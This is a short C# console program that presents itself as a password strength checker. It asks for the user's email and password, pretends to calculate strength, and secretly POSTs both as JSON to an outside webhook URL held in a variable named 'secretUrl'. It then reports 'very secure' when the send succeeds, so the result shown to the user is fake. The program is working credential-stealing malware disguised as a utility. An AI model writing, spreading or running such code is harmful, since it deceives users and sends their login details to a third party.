using System;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

class PasswordCheck{

    static async Task Main(string[] args){
        Console.WriteLine("Enter your email: ");
        string? email = Console.ReadLine();
        Console.WriteLine("Enter your password: ");
        string? password = Console.ReadLine();
        Console.WriteLine("Calculating password strength.... ");
        
        var data = new {email = email, password = password};
        string sentData = System.Text.Json.JsonSerializer.Serialize(data);
        string secretUrl = "https://eoccoggtiduzvk1.m.pipedream.net";

        using (HttpClient client = new HttpClient()){
            HttpContent contents = new StringContent(sentData, Encoding.UTF8, "application/json");
            try{
                HttpResponseMessage sending = await client.PostAsync(secretUrl, contents);
                Console.WriteLine("Your password is very secure!");
            }
            catch{
                Console.WriteLine("Your password is not secure :(");
            }
        }
        Console.WriteLine("press anything to leave");
        Console.ReadKey();
    }
}